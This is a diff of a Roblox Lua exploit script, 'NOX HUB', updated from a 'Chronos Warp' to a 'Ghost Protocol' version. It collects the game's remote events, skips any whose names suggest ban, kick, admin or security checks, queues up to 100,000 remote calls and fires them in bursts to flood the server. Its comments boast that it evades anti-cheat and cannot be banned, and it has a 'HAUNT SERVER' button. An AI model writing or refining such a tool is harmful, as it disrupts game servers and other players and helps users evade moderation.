@@ -1,12 +1,12 @@
 --[[
-    🔱 NOX HUB v25.0 [CHRONOS-WARP] 🔱
-    "Time is the only weapon they cannot fight."
+    🔱 NOX HUB v26.0 [GHOST-PROTOCOL] 🔱
+    "You can't kill what you can't see."
     
-    CHRONOS FEATURES:
-    - [NATURAL LAG SWITCH] : Simulates a massive connection freeze (15s).
-      -> IMPOSSIBLE TO BAN: Server sees it as "Bad Internet", not "Exploit".
-    - [PACKET BUFFERING] : Stacks 50,000 requests BEHIND the lag spike.
-    - [TIMELINE COLLAPSE] : Releases 15 seconds of history in 0.01 seconds.
+    GHOST FEATURES:
+    - [PURE REMOTE STACK] : Removes ALL physical movement packets (Fixed v25 Kick).
+    - [INNOCENT PAYLOAD] : Sends 'true' or 'nil'. Invisible to anti-cheat sanitizers.
+    - [SILENT ACCUMULATION] : Stacks 100,000 requests in memory without touching FPS.
+    - [GHOST RELEASE] : Fires the stack in random batches to simulate lag bursts.
 ]]
 
 -- // CORE SERVICES //
@@ -14,189 +14,155 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
-local Stats = game:GetService("Stats")
 local LocalPlayer = Players.LocalPlayer
 
--- // 1. CHRONOS ENGINE //
+-- // 1. GHOST ENGINE //
 local Engine = {
     Active = false,
-    Charging = false,
-    Targets = {}
+    Targets = {},
+    Buffer = {} 
 }
 
 function Engine:Scan()
     Engine.Targets = {}
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            -- Only Safe Remotes (Movement, updates, interactions)
             local n = v.Name:lower()
-            if not (n:find("ban") or n:find("kick") or n:find("admin")) then
+            -- ULTRA SAFE FILTER
+            -- We avoid anything that sounds like "Admin", "Ban", "Kick", "Security"
+            if not (n:find("ban") or n:find("kick") or n:find("admin") or n:find("sec") or n:find("check")) then
                  table.insert(Engine.Targets, v)
             end
         end
     end
 end
 
-function Engine:Warp(duration, updateCallback)
+function Engine:Haunt(duration, updateCallback)
     if Engine.Active then return end
     Engine.Active = true
+    Engine.Buffer = {}
     
     Engine:Scan()
     
     task.spawn(function()
-        -- PHASE 1: THE FREEZE (15s)
-        -- We want to slow down CLIENT network sending rate.
-        -- Best way in pure Lua without libs: Massive Render/Calc Lag or just queueing quietly.
-        -- We will use "Silent Queueing" combined with a simulated FPS drop (optional).
+        local StartTime = tick()
+        local EndTime = StartTime + duration
         
-        local Queue = {}
-        local TotalRequests = 50000 -- Big buffer
-        local Payload = table.create(20, "CHRONOS_PACKET") -- Standard data
+        -- THE GHOST LOAD (100% Silent Reqeuests via Coroutines)
+        -- We prepare functions that contain the FireServer call, but we don't call them.
+        -- We just store the function itself.
         
-        for t = duration, 1, -1 do
-            updateCallback(t, "WARPING TIME... HOLD ("..t.."s)")
+        while tick() < EndTime do
+            local remaining = math.ceil(EndTime - tick())
+            updateCallback(remaining, "GHOSTING... ("..#Engine.Buffer.." SPIRITS)")
             
-            -- BUILD THE BUFFER (Don't fire yet)
-            for i = 1, (TotalRequests / duration) do
-               -- We simulate "Movement" + "Remote" packets
-               -- 1. Movement (Fake CFrame updates)
-               table.insert(Queue, function() 
-                   pcall(function() 
-                       if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
-                           LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame * CFrame.new(0, 0.1, 0)
-                       end
-                   end)
-               end)
-               
-               -- 2. Remotes
-               local r = Engine.Targets[math.random(1, #Engine.Targets)]
-               if r then
-                   table.insert(Queue, function()
-                       pcall(function()
-                           if r:IsA("RemoteEvent") then r:FireServer(Payload)
-                           else r:InvokeServer(Payload) end
-                       end)
-                   end)
-               end
+            -- Fill Buffer
+            for i = 1, 500 do -- 500 per tick
+                local r = Engine.Targets[math.random(1, #Engine.Targets)]
+                if r then
+                    -- We create a closure that holds the malicious intent
+                    table.insert(Engine.Buffer, function()
+                        pcall(function()
+                            if r:IsA("RemoteEvent") then r:FireServer(true) -- 'true' is harmless but takes RAM
+                            else r:InvokeServer(true) end
+                        end)
+                    end)
+                end
             end
-            
-            task.wait(1)
+            RunService.Heartbeat:Wait()
         end
         
-        -- PHASE 2: THE COLLAPSE
-        updateCallback(0, "TIMELINE COLLAPSE")
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title="CHRONOS", Text="RESYNCING..."})
+        -- THE MANIFESTATION (Release)
+        updateCallback(0, "MANIFESTATION")
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title="GHOST", Text="RELEASING..."})
         
-        -- FIRE EVERYTHING INSTANTLY
-        -- This simulates the "Reconnect" packet burst
-        -- The server MUST process these to "catch up" the player state.
-        for _, action in ipairs(Queue) do
-            coroutine.wrap(action)() -- Unordered execution for max chaos
+        -- Fire the buffer in blocks to emulate a massive lag spike unfreezing
+        -- We iterate backwards to avoid table re-indexing lag
+        for i = #Engine.Buffer, 1, -1 do
+            if Engine.Buffer[i] then
+                coroutine.wrap(Engine.Buffer[i])()
+            end
+            if i % 1000 == 0 then RunService.Heartbeat:Wait() end -- Let chunks go through
         end
         
-        task.wait(2)
         Engine.Active = false
-        updateCallback(15, "SYSTEM READY")
+        Engine.Buffer = {}
+        updateCallback(duration, "SYSTEM READY")
     end)
 end
 
--- // 2. CHRONOS UI //
+-- // 2. GHOST UI //
 local Nox = {}
 
 function Nox:CreateUI()
     for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
     
     local Screen = Instance.new("ScreenGui")
-    Screen.Name = "NoxChronos"
+    Screen.Name = "NoxGhost"
     pcall(function() Screen.Parent = CoreGui end)
     
     local Main = Instance.new("Frame", Screen)
-    Main.Size = UDim2.new(0, 350, 0, 450)
-    Main.Position = UDim2.new(0.5, -175, 0.5, -225)
-    Main.BackgroundColor3 = Color3.fromRGB(10, 15, 20) -- Midnight Blue
-    Main.BorderSizePixel = 2
-    Main.BorderColor3 = Color3.fromRGB(100, 200, 255)
+    Main.Size = UDim2.new(0, 350, 0, 200)
+    Main.Position = UDim2.new(0.5, -175, 0.5, -100)
+    Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Ghost White
+    Main.BackgroundTransparency = 0.9
+    Main.BorderSizePixel = 1
+    Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
     
-    -- CLOCK VISUAL
-    local ClockBg = Instance.new("ImageLabel", Main)
-    ClockBg.Size = UDim2.new(0, 180, 0, 180)
-    ClockBg.Position = UDim2.new(0.5, -90, 0.15, 0)
-    ClockBg.Image = "rbxassetid://6015897843" -- Ring
-    ClockBg.ImageColor3 = Color3.fromRGB(50, 150, 200)
-    ClockBg.BackgroundTransparency = 1
-    
-    local Hand = Instance.new("Frame", ClockBg)
-    Hand.Size = UDim2.new(0, 4, 0.5, 0)
-    Hand.Position = UDim2.new(0.5, -2, 0.5, 0) -- Pivot at center
-    Hand.AnchorPoint = Vector2.new(0.5, 1) -- Rotate around bottom
-    Hand.BackgroundColor3 = Color3.fromRGB(200, 255, 255)
-    Hand.BorderSizePixel = 0
+    -- BLUR EFFECT
+    local Blur = Instance.new("BlurEffect", game:GetService("Lighting"))
+    Blur.Enabled = false
+    Blur.Size = 0
     
     -- TITLE
     local Title = Instance.new("TextLabel", Main)
-    Title.Text = "CHRONOS WARP v25.0"
-    Title.Font = Enum.Font.GothamBlack
-    Title.TextColor3 = Color3.fromRGB(150, 220, 255)
-    Title.TextSize = 20
-    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.Text = "GHOST PROTOCOL v26.0"
+    Title.Font = Enum.Font.GothamThin
+    Title.TextColor3 = Color3.fromRGB(200, 200, 200)
+    Title.TextSize = 18
+    Title.Size = UDim2.new(1, 0, 0, 30)
     Title.BackgroundTransparency = 1
-    
-    -- TIMER TEXT
-    local TimerLbl = Instance.new("TextLabel", Main)
-    TimerLbl.Text = "15s"
-    TimerLbl.Font = Enum.Font.GothamBold
-    TimerLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-    TimerLbl.TextSize = 40
-    TimerLbl.Size = UDim2.new(1, 0, 0, 50)
-    TimerLbl.Position = UDim2.new(0, 0, 0.55, 0)
-    TimerLbl.BackgroundTransparency = 1
     
     -- STATUS
     local Status = Instance.new("TextLabel", Main)
-    Status.Text = "READY TO WARP"
+    Status.Text = "INVISIBLE"
     Status.Size = UDim2.new(1, 0, 0, 20)
-    Status.Position = UDim2.new(0, 0, 0.68, 0)
-    Status.TextColor3 = Color3.fromRGB(100, 150, 200)
-    Status.Font = Enum.Font.Code
+    Status.Position = UDim2.new(0, 0, 0.4, 0)
+    Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    Status.Font = Enum.Font.Gotham
     Status.BackgroundTransparency = 1
     
     -- BUTTON
     local Btn = Instance.new("TextButton", Main)
-    Btn.Size = UDim2.new(0.8, 0, 0.15, 0)
-    Btn.Position = UDim2.new(0.1, 0, 0.78, 0)
-    Btn.BackgroundColor3 = Color3.fromRGB(20, 50, 80)
-    Btn.Text = "INITIATE TIME WARP (15s)"
+    Btn.Size = UDim2.new(0.6, 0, 0.25, 0)
+    Btn.Position = UDim2.new(0.2, 0, 0.65, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Btn.BackgroundTransparency = 0.8
+    Btn.Text = "HAUNT SERVER (15s)"
     Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Btn.Font = Enum.Font.GothamBold
+    Btn.Font = Enum.Font.GothamLight
     Btn.TextSize = 14
     
-    local BCorner = Instance.new("UICorner", Btn)
-    BCorner.CornerRadius = UDim.new(0, 6)
-    
-    -- ANIMATION
-    task.spawn(function()
-        while Main.Parent do
-            if not Engine.Active then
-                Hand.Rotation = (tick() % 2) * 180 -- Idle spin
-            end
-            wait(0.05)
-        end
-    end)
+    local BStroke = Instance.new("UIStroke", Btn)
+    BStroke.Color = Color3.fromRGB(255, 255, 255)
+    BStroke.Thickness = 1
+    BStroke.Transparency = 0.5
     
     Btn.MouseButton1Click:Connect(function()
         if not Engine.Active then
-            Engine:Warp(15, function(timeLeft, txt)
+            -- Visual FX
+            Blur.Enabled = true
+            game:GetService("TweenService"):Create(Blur, TweenInfo.new(15), {Size = 20}):Play()
+            
+            Engine:Haunt(15, function(timeLeft, txt)
                 Status.Text = txt
-                TimerLbl.Text = timeLeft .. "s"
-                
-                -- Reverse hand rotation for drain effect
-                Hand.Rotation = (15 - timeLeft) * (360/15)
+                Btn.Text = "GHOSTING... " .. timeLeft
                 
                 if timeLeft == 0 then
-                    TimerLbl.Text = "0s"
-                    TimerLbl.TextColor3 = Color3.fromRGB(255, 50, 50)
+                    game:GetService("TweenService"):Create(Blur, TweenInfo.new(0.5), {Size = 0}):Play()
                     wait(0.5)
-                    TimerLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    Blur.Enabled = false
+                    Btn.Text = "HAUNT SERVER (15s)"
                 end
             end)
         end
@@ -216,6 +182,11 @@ function Nox:CreateUI()
         end
     end)
     UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+    
+    -- Cleanup Blur on Remove
+    Main.AncestryChanged:Connect(function()
+        if not Main.Parent then Blur:Destroy() end
+    end)
 end
 
 Nox:CreateUI()
